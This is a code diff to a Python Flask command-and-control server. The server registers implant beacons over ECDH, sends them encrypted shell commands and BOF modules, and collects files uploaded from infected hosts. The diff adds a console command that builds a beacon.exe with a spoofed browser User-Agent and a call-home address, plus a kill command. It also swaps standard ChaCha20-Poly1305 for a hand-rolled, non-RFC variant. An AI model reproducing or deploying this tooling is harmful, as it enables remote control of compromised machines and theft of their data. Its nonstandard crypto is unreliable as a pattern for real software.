@@ -1,4 +1,4 @@
-import os, re, sys, json, uuid, threading, logging, struct, hashlib
+import os, re, sys, json, uuid, threading, logging, struct, hashlib, argparse, shlex, subprocess
 from datetime import datetime
 from flask import Flask, request
 
@@ -6,78 +6,129 @@ from cryptography.hazmat.primitives.asymmetric.ec import (
     ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
 )
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
-from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
-from profile_loader import load_profile
 
 # ---------------------------------------------------------------------------
-# Flask app & C2 Profile
+# Server config — set entirely from CLI args at startup
+# ---------------------------------------------------------------------------
+_arg_parser = argparse.ArgumentParser(
+    prog="c2server",
+    description="C2 Server",
+    formatter_class=argparse.RawTextHelpFormatter,
+)
+_arg_parser.add_argument("--ip",     default="0.0.0.0",       metavar="ADDR",  help="bind address          (default: 0.0.0.0)")
+_arg_parser.add_argument("--port",   default=8080, type=int,   metavar="PORT",  help="listen port           (default: 8080)")
+_arg_parser.add_argument("--token",  default="",               metavar="TOKEN", help="registration auth token (default: none)")
+_arg_parser.add_argument("--https",  action="store_true",                       help="enable HTTPS (requires --cert and --key)")
+_arg_parser.add_argument("--cert",   default="",               metavar="FILE",  help="TLS certificate file")
+_arg_parser.add_argument("--key",    default="",               metavar="FILE",  help="TLS key file")
+SERVER_ARGS = _arg_parser.parse_args()
+
+LISTEN_IP   = SERVER_ARGS.ip
+LISTEN_PORT = SERVER_ARGS.port
+AUTH_TOKEN  = SERVER_ARGS.token
+USE_HTTPS   = SERVER_ARGS.https
+SSL_CONTEXT = (SERVER_ARGS.cert, SERVER_ARGS.key) if (USE_HTTPS and SERVER_ARGS.cert and SERVER_ARGS.key) else None
+
+# ---------------------------------------------------------------------------
+# Flask app
 # ---------------------------------------------------------------------------
 app = Flask(__name__)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
-# Load C2 profile
-PROFILE_DIR = "profiles"
-PROFILE_FILE = os.path.join(PROFILE_DIR, "default.json")
-profile = load_profile(PROFILE_FILE)
-if not profile:
-    print("[!] Failed to load C2 profile from " + PROFILE_FILE)
-    sys.exit(1)
-
-# agents[aid] = { ...metadata..., "key": bytes }
 agents        = {}
 command_queue = {}
 BOF_DIR       = "bofs"
 UPLOAD_DIR    = "uploads"
 STATE_FILE    = "agents.json"
-ENV_AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "")
-AUTH_TOKEN    = ENV_AUTH_TOKEN if ENV_AUTH_TOKEN else profile.auth_token
-AUTH_HEADER   = profile.auth_header
-SSL_CERT_FILE = os.environ.get("C2_SSL_CERT", "")
-SSL_KEY_FILE  = os.environ.get("C2_SSL_KEY", "")
-SSL_CONTEXT   = (SSL_CERT_FILE, SSL_KEY_FILE) if SSL_CERT_FILE and SSL_KEY_FILE else None
+AUTH_HEADER   = "X-C2-Token"
 
 _print_lock     = threading.Lock()
 _current_prompt = ""
 
 # ---------------------------------------------------------------------------
-# ChaCha20-Poly1305 AEAD encryption — key is derived per-agent via ECDH
+# ChaCha20-Poly1305 — simple scheme matching the C agent.
+#
+# Wire format: nonce(12) || ciphertext(N) || tag(16)
+# Tag covers ciphertext only (no AAD, no length block).
+#
+# Python's ChaCha20Poly1305 class follows RFC 8439 and appends a length block
+# to the Poly1305 input — the C agent does not, so we can't use that class here.
 # ---------------------------------------------------------------------------
 
-def decrypt_request(key: bytes, data: bytes) -> bytes:
-    """Decrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
-    if len(data) < 12:
-        return b''
-    nonce = data[:12]
-    ciphertext = data[12:]
-    try:
-        cipher = ChaCha20Poly1305(key)
-        return cipher.decrypt(nonce, ciphertext, None)
-    except Exception:
-        return b''
+def _rotl32(v: int, n: int) -> int:
+    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF
+
+def _chacha20_block(key: bytes, nonce: bytes, counter: int) -> bytes:
+    sigma = b"expand 32-byte k"
+    s = [struct.unpack_from("<I", sigma, i * 4)[0] for i in range(4)]
+    s += [struct.unpack_from("<I", key,   i * 4)[0] for i in range(8)]
+    s += [counter]
+    s += [struct.unpack_from("<I", nonce, i * 4)[0] for i in range(3)]
+    orig = s[:]
+    for _ in range(10):
+        for a, b, c, d in [(0,4,8,12),(1,5,9,13),(2,6,10,14),(3,7,11,15),
+                           (0,5,10,15),(1,6,11,12),(2,7,8,13),(3,4,9,14)]:
+            s[a]=(s[a]+s[b])&0xFFFFFFFF; s[d]^=s[a]; s[d]=_rotl32(s[d],16)
+            s[c]=(s[c]+s[d])&0xFFFFFFFF; s[b]^=s[c]; s[b]=_rotl32(s[b],12)
+            s[a]=(s[a]+s[b])&0xFFFFFFFF; s[d]^=s[a]; s[d]=_rotl32(s[d], 8)
+            s[c]=(s[c]+s[d])&0xFFFFFFFF; s[b]^=s[c]; s[b]=_rotl32(s[b], 7)
+    return struct.pack("<16I", *[(s[i] + orig[i]) & 0xFFFFFFFF for i in range(16)])
+
+def _chacha20_xor(data: bytes, key: bytes, nonce: bytes, counter: int) -> bytes:
+    out = bytearray(len(data))
+    pos, ctr = 0, counter
+    while pos < len(data):
+        block = _chacha20_block(key, nonce, ctr); ctr += 1
+        chunk = min(64, len(data) - pos)
+        for i in range(chunk):
+            out[pos + i] = data[pos + i] ^ block[i]
+        pos += chunk
+    return bytes(out)
+
+def _poly1305_mac(otk: bytes, msg: bytes) -> bytes:
+    rb = bytearray(otk[:16])
+    rb[3]&=15; rb[7]&=15; rb[11]&=15; rb[15]&=15
+    rb[4]&=252; rb[8]&=252; rb[12]&=252
+    r = int.from_bytes(rb, "little")
+    s = int.from_bytes(otk[16:32], "little")
+    p = (1 << 130) - 5
+    h = 0
+    for i in range(0, len(msg), 16):
+        block = msg[i:i + 16]
+        n = int.from_bytes(block, "little") + (1 << (8 * len(block)))
+        h = ((h + n) * r) % p
+    return ((h + s) & ((1 << 128) - 1)).to_bytes(16, "little")
 
 def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
-    """Encrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
-    nonce = os.urandom(12)
-    cipher = ChaCha20Poly1305(key)
-    ciphertext = cipher.encrypt(nonce, plaintext, None)
-    return nonce + ciphertext
+    nonce  = os.urandom(12)
+    ct     = _chacha20_xor(plaintext, key, nonce, 1)
+    otk    = _chacha20_block(key, nonce, 0)[:32]
+    tag    = _poly1305_mac(otk, ct)
+    return nonce + ct + tag
+
+def decrypt_request(key: bytes, data: bytes) -> bytes:
+    if len(data) < 28:   # 12 nonce + 0 ct + 16 tag minimum
+        return b''
+    nonce  = data[:12]
+    ct     = data[12:-16]
+    tag_in = data[-16:]
+    otk    = _chacha20_block(key, nonce, 0)[:32]
+    if _poly1305_mac(otk, ct) != tag_in:
+        return b''
+    return _chacha20_xor(ct, key, nonce, 1)
 
 # ---------------------------------------------------------------------------
-# ECDH-P256 key exchange
-# Beacon sends:  0x04 || X[32] || Y[32]  (65-byte X9.62 uncompressed pubkey)
-# Server replies: 0x04 || X[32] || Y[32] || uuid_str  (65 + 36 = 101 bytes)
-# Both sides derive: SHA-256(shared_secret)[:32]  →  32-byte ChaCha20-Poly1305 key
+# ECDH key exchange
 # ---------------------------------------------------------------------------
 
 def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
-    """Given our private key and the peer's raw 65-byte X9.62 pubkey, return the 32-byte ChaCha20-Poly1305 key."""
-    peer_pub    = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
-    shared      = our_priv.exchange(ECDH(), peer_pub)
-    return hashlib.sha256(shared).digest()  # full 32 bytes for ChaCha20-Poly1305
+    peer_pub = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
+    shared   = our_priv.exchange(ECDH(), peer_pub)
+    return hashlib.sha256(shared).digest()
 
 # ---------------------------------------------------------------------------
-# Terminal primitives (unchanged)
+# Terminal primitives
 # ---------------------------------------------------------------------------
 W  = 72
 HR = "─" * W
@@ -111,6 +162,7 @@ _TAGS = {
     "down": lambda: c(" DOWN ", YELLOW),
     "info": lambda: c(" INFO ", GREY),
     "warn": lambda: c(" WARN ", YELLOW),
+    "build": lambda: c("BUILD ", CYAN),
 }
 
 def _reprint_prompt():
@@ -186,6 +238,10 @@ def agent_status(dt):
     if s < 120: return c("IDLE", YELLOW)
     return c("DEAD", RED)
 
+# ---------------------------------------------------------------------------
+# State persistence
+# ---------------------------------------------------------------------------
+
 def save_state():
     try:
         with open(STATE_FILE, "w") as f:
@@ -218,11 +274,9 @@ def save_state():
 def load_state():
     if not os.path.exists(STATE_FILE):
         return
-
     try:
         with open(STATE_FILE, "r") as f:
             data = json.load(f)
-
         for aid, state in data.items():
             try:
                 agents[aid] = {
@@ -244,7 +298,6 @@ def load_state():
                 command_queue[aid] = None
             except Exception as e:
                 async_log(f"Failed to restore agent {aid[:8]}: {e}", "warn")
-
         if agents:
             async_log(f"Restored {len(agents)} agent(s) from {STATE_FILE}", "ok")
     except Exception as e:
@@ -268,25 +321,13 @@ def new_agent(key: bytes) -> dict:
 # ---------------------------------------------------------------------------
 
 @app.route("/register", methods=["POST"])
-@app.route(f"{profile.register_path}", methods=["POST"])
 def route_register():
-    """
-    ECDH handshake — plaintext, no encryption yet.
-
-    Request body:  65 bytes  — beacon's X9.62 uncompressed P-256 pubkey
-    Response body: 65 bytes  — server's X9.62 uncompressed P-256 pubkey
-                 + 36 bytes  — agent UUID (ASCII)
-    If server auth is enabled via C2_AUTH_TOKEN, the beacon must supply the
-    X-C2-Token header with the registration request.
-    Both sides then derive: ChaCha20-Poly1305 key = SHA-256(ECDH shared secret)
-    All subsequent traffic is encrypted with that key.
-    """
     beacon_pub_bytes = request.data
 
     if AUTH_TOKEN:
         token = request.headers.get(AUTH_HEADER, "")
         if token != AUTH_TOKEN:
-            async_log(f"Bad {profile.register_path} auth token from {request.remote_addr}", "warn")
+            async_log(f"Bad /register auth from {request.remote_addr}", "warn")
             return b"forbidden", 403
 
     if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
@@ -294,12 +335,10 @@ def route_register():
         return b"bad request", 400
 
     try:
-        # Generate ephemeral server keypair
         server_priv      = generate_private_key(SECP256R1())
         server_pub_bytes = server_priv.public_key().public_bytes(
             Encoding.X962, PublicFormat.UncompressedPoint
         )
-        # Derive the per-agent ChaCha20-Poly1305 key (32 bytes)
         session_key = ecdh_derive_session_key(server_priv, beacon_pub_bytes)
     except Exception as e:
         async_log(f"ECDH failed: {e}", "err")
@@ -315,8 +354,6 @@ def route_register():
         "ok"
     )
     save_state()
-
-    # server pubkey (65) + agent UUID (36)
     return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}
 
 
@@ -354,7 +391,14 @@ def route_checkin(aid):
         a["bytes_sent"]    += len(cmd)
         preview = cmd[:55] + ("..." if len(cmd) > 55 else "")
         async_log(f"Dispatch  {c(aid[:8], CYAN)}  {c(preview, DIM)}", "send")
-        return encrypt_response(key, cmd.encode()), 200, {"Content-Type": "application/octet-stream"}
+        response = encrypt_response(key, cmd.encode())
+        if cmd == "KILL":
+            # Remove agent from state after dispatching — it won't check in again
+            agents.pop(aid, None)
+            command_queue.pop(aid, None)
+            save_state()
+            async_log(f"Agent removed  {c(aid[:8], CYAN)}", "ok")
+        return response, 200, {"Content-Type": "application/octet-stream"}
 
     return encrypt_response(key, b""), 200
 
@@ -400,25 +444,6 @@ def route_upload(aid, filename):
     async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
     return encrypt_response(key, b"OK"), 200
 
-# unused right now just not important
-@app.route("/download/<aid>/<filename>", methods=["POST"])
-def route_download(aid, filename):
-    if aid not in agents:
-        return b"unknown", 404
-
-    key = agents[aid]["key"]
-    if not os.path.exists(filename):
-        async_log(f"File not found: {filename}", "err")
-        return encrypt_response(key, b"not found"), 404
-
-    with open(filename, "rb") as f:
-        data = f.read()
-
-    agents[aid]["bytes_sent"] += len(data)
-    async_log(f"Download  {c(filename, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
-    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}
-
-
 # ---------------------------------------------------------------------------
 # BOF argument packing
 # ---------------------------------------------------------------------------
@@ -428,8 +453,9 @@ except ImportError:
     sys.exit("FATAL  beacon_generate.py not found")
 
 # ---------------------------------------------------------------------------
-# CLI commands (unchanged)
+# CLI commands
 # ---------------------------------------------------------------------------
+
 def cmd_list():
     header("AGENTS")
     if not agents:
@@ -454,6 +480,7 @@ def cmd_list():
         )
     section_end()
 
+
 def cmd_bofs():
     header("BOF MODULES", sub=os.path.abspath(BOF_DIR))
     if not os.path.isdir(BOF_DIR):
@@ -472,6 +499,7 @@ def cmd_bofs():
         table_row((32, c(base, WHITE)), (12, fmt_bytes(size)), (10, c(ext, GREY)))
     print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
     section_end()
+
 
 def cmd_info(aid):
     a = agents[aid]
@@ -494,6 +522,7 @@ def cmd_info(aid):
             print(f"  {line}")
     section_end()
 
+
 def cmd_stats(aid):
     a      = agents[aid]
     uptime = (datetime.now() - a["registered"]).total_seconds()
@@ -506,6 +535,7 @@ def cmd_stats(aid):
     if a["command_count"]:
         row("Avg / cmd", fmt_bytes(a["bytes_sent"] / a["command_count"]))
     section_end()
+
 
 def cmd_output(aid, n=10):
     hist = agents[aid]["output_history"]
@@ -522,56 +552,151 @@ def cmd_output(aid, n=10):
         print()
     section_end()
 
-def cmd_profile():
-    header("C2 PROFILE", sub=profile.name)
-    row("Name",               profile.name)
-    row("Base Sleep",         f"{profile.base_sleep_ms}ms")
-    row("Jitter",             f"±{profile.jitter_ms}ms")
-    row("User-Agent",         profile.user_agent[:50] + ("..." if len(profile.user_agent) > 50 else ""))
-    row("Auth Header",        profile.auth_header)
-    row("Server IP",          profile.server_ip)
-    row("Server Port",        str(profile.server_port))
-    row("HTTPS",              "Yes" if profile.use_https else "No")
-    section_end()
+
+def cmd_generate(args_str):
+    """
+    Build a beacon binary from the console without touching any config file.
+
+    Usage:
+      generate [--ip ADDR] [--port PORT] [--ua STRING] [--token STRING]
+               [--sleep MS] [--jitter MS] [--https] [--out NAME]
+
+    All flags are optional; defaults match the server's own startup values.
+    The server address and port default to whatever this server is listening on,
+    so a plain `generate` with no flags just works for a local test.
+    """
+    gen = argparse.ArgumentParser(prog="generate", add_help=False, exit_on_error=False)
+    gen.add_argument("--ip",     default=LISTEN_IP  if LISTEN_IP != "0.0.0.0" else "127.0.0.1")
+    gen.add_argument("--port",   default=str(LISTEN_PORT))
+    gen.add_argument("--ua",     default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    gen.add_argument("--token",  default=AUTH_TOKEN)
+    gen.add_argument("--sleep",  default="5000")
+    gen.add_argument("--jitter", default="3000")
+    gen.add_argument("--https",  action="store_true")
+    gen.add_argument("--out",    default="beacon.exe")
+
+    try:
+        gargs = gen.parse_args(shlex.split(args_str) if args_str else [])
+    except (argparse.ArgumentError, SystemExit):
+        log("usage: generate [--ip X] [--port X] [--ua X] [--token X] [--sleep X] [--jitter X] [--https] [--out X]", "err")
+        return
+
+    # Locate build.bat relative to this script
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    bat        = os.path.join(script_dir, "..", "agent", "build.bat")
+    bat        = os.path.normpath(bat)
+
+    if not os.path.exists(bat):
+        log(f"build.bat not found at {bat}", "err")
+        return
+
+    https_flag = "1" if gargs.https else "0"
+
+    call = [bat, gargs.ip, gargs.port, gargs.ua, gargs.token,
+            gargs.sleep, gargs.jitter, https_flag, gargs.out]
+
+    log(
+        f"Building  {c(gargs.out, CYAN)}  "
+        f"ip={c(gargs.ip, WHITE)}  port={c(gargs.port, WHITE)}  "
+        f"https={c(str(gargs.https), WHITE)}",
+        "build"
+    )
+
+    agent_dir  = os.path.normpath(os.path.join(script_dir, "..", "agent"))
+    build_dir  = os.path.join(agent_dir, "build")
+    final_out  = gargs.out                              # e.g. beacon.exe
+    tmp_out    = "_tmp_" + final_out                    # build to this first
+
+    # Build to a temp filename so the linker never touches the live binary.
+    # Once the build succeeds, atomically replace the real file.
+    if os.name == "nt":
+        invoke = ["cmd", "/c", bat, gargs.ip, gargs.port, gargs.ua,
+                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
+    else:
+        invoke = [bat, gargs.ip, gargs.port, gargs.ua,
+                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
+
+    try:
+        result = subprocess.run(
+            invoke,
+            capture_output=True,
+            text=True,
+            cwd=agent_dir,
+        )
+    except Exception as e:
+        log(f"Failed to invoke build.bat: {e}", "err")
+        return
+
+    if result.returncode == 0:
+        # Rename temp -> final (overwrites on Windows too via os.replace)
+        tmp_path   = os.path.join(build_dir, tmp_out)
+        final_path = os.path.join(build_dir, final_out)
+        try:
+            os.replace(tmp_path, final_path)
+            log(f"Built  {c(final_path, CYAN)}", "ok")
+        except OSError as e:
+            log(f"Build succeeded but rename failed: {e}", "err")
+            log(f"Binary is at {c(tmp_path, CYAN)}", "info")
+    else:
+        log("Build failed", "err")
+        output = (result.stdout + result.stderr).strip()
+        if output:
+            print(c("  " + HR, DIM))
+            for line in output[-800:].splitlines():
+                print(f"  {c(line, GREY)}")
+            print(c("  " + HR, DIM))
 
 def cmd_help():
     header("COMMAND REFERENCE")
     sections = [
         ("GLOBAL", [
-            ("list",               "list all agents"),
-            ("bofs",               "list available BOF modules"),
-            ("profile",            "show active C2 profile"),
-            ("use <id>",           "select agent by full or partial ID"),
-            ("clear",              "clear the terminal"),
-            ("help",               "show this reference"),
-            ("exit",               "shutdown server"),
+            ("list",                      "list all agents"),
+            ("bofs",                      "list available BOF modules"),
+            ("generate [flags]",          "build a beacon binary (see below)"),
+            ("use <id>",                  "select agent by full or partial ID"),
+            ("clear",                     "clear the terminal"),
+            ("help",                      "show this reference"),
+            ("exit",                      "shutdown server"),
         ]),
         ("AGENT  (requires: use <id>)", [
-            ("shell <cmd>",        "execute shell command"),
-            ("bof <name> [args]",  "execute BOF module"),
-            ("output [n]",         "show last N outputs  (default 10)"),
-            ("info",               "agent details + session key"),
-            ("stats",              "session statistics"),
-            ("back",               "deselect agent"),
+            ("shell <cmd>",               "execute shell command"),
+            ("bof <name> [args]",         "execute BOF module"),
+            ("output [n]",                "show last N outputs  (default 10)"),
+            ("info",                      "agent details + session key"),
+            ("stats",                     "session statistics"),
+            ("kill",                      "terminate the agent process and remove it"),
+            ("back",                      "deselect agent"),
+        ]),
+        ("GENERATE FLAGS  (all optional)", [
+            ("--ip ADDR",                 f"C2 server IP the beacon calls home to  (default: server listen IP)"),
+            ("--port PORT",               f"C2 server port                          (default: {LISTEN_PORT})"),
+            ("--ua STRING",               "HTTP User-Agent string"),
+            ("--token STRING",            "registration auth token"),
+            ("--sleep MS",                "beacon check-in interval in ms          (default: 5000)"),
+            ("--jitter MS",               "sleep jitter in ms                      (default: 3000)"),
+            ("--https",                   "enable HTTPS in the beacon"),
+            ("--out NAME",                "output filename                         (default: beacon.exe)"),
         ]),
         ("BOF ARGUMENT TYPES", [
-            ("s:<value>",          "UTF-8 string"),
-            ("w:<value>",          "UTF-16LE wide string"),
-            ("i:<value>",          "32-bit integer"),
-            ("h:<value>",          "16-bit short"),
-            ("<value>",            "no prefix defaults to string"),
+            ("s:<value>",                 "UTF-8 string"),
+            ("w:<value>",                 "UTF-16LE wide string"),
+            ("i:<value>",                 "32-bit integer"),
+            ("h:<value>",                 "16-bit short"),
+            ("<value>",                   "no prefix defaults to string"),
         ]),
     ]
     for title, entries in sections:
         print(f"  {c(title, BOLD + WHITE)}")
-        for cmd, desc in entries:
-            print(f"  {c(cmd.ljust(28), CYAN)}{c(desc, GREY)}")
+        for cmd_str, desc in entries:
+            print(f"  {c(cmd_str.ljust(32), CYAN)}{c(desc, GREY)}")
         print()
     section_end()
+
 
 def send_cmd(aid, cmd):
     command_queue[aid] = cmd
     log(f"Queued  agent={c(aid[:8], CYAN)}", "info")
+
 
 def send_bof(aid, name, args_str=""):
     bp = BeaconPack()
@@ -589,6 +714,7 @@ def send_bof(aid, name, args_str=""):
             bp.addstr(token)
     send_cmd(aid, f"BOF:{name}:{bp.getbuffer().hex()}")
 
+
 def resolve_agent(partial):
     matches = [a for a in agents if a.startswith(partial)]
     if not matches:
@@ -596,6 +722,7 @@ def resolve_agent(partial):
     if len(matches) > 1:
         return None, f"ambiguous ID  matches={[m[:8] for m in matches]}"
     return matches[0], None
+
 
 def interactive_shell():
     global _current_prompt
@@ -633,8 +760,8 @@ def interactive_shell():
                 cmd_list()
             elif cmd == "bofs":
                 cmd_bofs()
-            elif cmd == "profile":
-                cmd_profile()
+            elif cmd == "generate":
+                cmd_generate(args)
             elif cmd == "help":
                 cmd_help()
             elif cmd == "use":
@@ -653,7 +780,7 @@ def interactive_shell():
                     current = None
                 else:
                     log("no agent selected", "warn")
-            elif cmd in ("shell", "bof", "output", "info", "stats"):
+            elif cmd in ("shell", "bof", "output", "info", "stats", "kill"):
                 if not current:
                     log("no agent selected  (use: use <id>)", "err")
                     continue
@@ -676,6 +803,10 @@ def interactive_shell():
                     cmd_info(current)
                 elif cmd == "stats":
                     cmd_stats(current)
+                elif cmd == "kill":
+                    command_queue[current] = "KILL"
+                    log(f"Kill queued for {c(current[:8], CYAN)}  (takes effect on next checkin)", "warn")
+                    current = None   # deselect so prompt doesn't show a dead agent
             else:
                 log(f"unknown command: {cmd}  (type help)", "err")
 
@@ -687,11 +818,14 @@ def interactive_shell():
             log(str(e), "err")
             import traceback; traceback.print_exc()
 
+
 def banner():
+    proto = "https" if USE_HTTPS else "http"
     print(f"\n{c(HL, DIM)}")
     print(f"  {c('C2 SERVER', BOLD + WHITE)}")
-    print(f"  {c('Profile: ' + profile.name, GREY)}")
+    print(f"  {c(f'{proto}://{LISTEN_IP}:{LISTEN_PORT}', GREY)}")
     print(f"{c(HL, DIM)}\n")
+
 
 if __name__ == "__main__":
     os.makedirs(BOF_DIR,    exist_ok=True)
@@ -702,19 +836,23 @@ if __name__ == "__main__":
 
     if AUTH_TOKEN:
         log(f"register auth enabled  header={AUTH_HEADER}", "warn")
-    if profile.use_https:
+    if USE_HTTPS:
         if SSL_CONTEXT:
-            log(f"HTTPS enabled  cert={SSL_CERT_FILE} key={SSL_KEY_FILE}", "warn")
+            log(f"HTTPS enabled  cert={SERVER_ARGS.cert}", "warn")
         else:
-            log("HTTPS requested by profile but no cert/key configured; starting HTTP", "warn")
+            log("--https requires --cert and --key  (generate with: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=127.0.0.1)", "err")
+            sys.exit(1)
 
     def _flask():
-        app.run(host="0.0.0.0", port=profile.server_port, debug=False, use_reloader=False, threaded=True,
-                ssl_context=SSL_CONTEXT if profile.use_https else None)
+        app.run(
+            host=LISTEN_IP, port=LISTEN_PORT,
+            debug=False, use_reloader=False, threaded=True,
+            ssl_context=SSL_CONTEXT if USE_HTTPS else None,
+        )
 
     threading.Thread(target=_flask, daemon=True).start()
 
-    log("listening    0.0.0.0:8080", "ok")
+    log(f"listening    {LISTEN_IP}:{LISTEN_PORT}", "ok")
     log(f"bof dir      {os.path.abspath(BOF_DIR)}", "ok")
     log(f"upload dir   {os.path.abspath(UPLOAD_DIR)}", "ok")
     print()
